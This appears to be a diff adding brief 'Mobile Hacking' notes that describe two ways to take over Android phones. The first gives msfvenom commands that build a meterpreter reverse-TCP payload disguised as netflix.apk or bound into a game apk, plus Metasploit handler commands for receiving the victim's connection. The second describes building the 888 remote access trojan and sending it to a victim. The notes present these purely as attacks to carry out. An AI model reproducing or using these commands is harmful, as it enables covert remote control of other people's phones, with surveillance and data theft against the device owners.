@@ -1,0 +1,25 @@
+                                                              Mobile Hacking
+
+First Method :
+Mobile Hacking through msfvenom :
+#msfvenom -p android/meterpreter/reverse_tcp LHOST=<ip address> LPORT=1337 -o /home/kali/Desktop/netflix.apk - This command will create our apk.
+#msfvenom -x flappy.apk -p android/meterpreter/reverse_tcp LHOST=192.168.1.7 LPORT=1337 -o flappynew.apk - For binding our trojan with another apk.
+
+Listen connection on metasploit :
+#msfconsole
+#use exploit/multi/handler
+#set payload android/meterpreter/reverse_tcp
+#set lhost <Ip address>
+#set lport 1337
+#exploit
+After that install that apk in victim's mobile for the connection.
+Now use command #help to show the full menu.
+
+Secoond Method :
+Mobile Hacking through 888 RAT(Remote Access Trojan) :
+For this rat first you have to install java jdk and JRE in your system, then you have to copy apktool file and paste it to Win+R>%temp%>apkx and paste this in this folder.
+Now make a RAT using this tool, set your ip, port and we can find this rat in %temp% file. After that send this rat to victim, when victim will install this we will get
+the access.
+
+
+
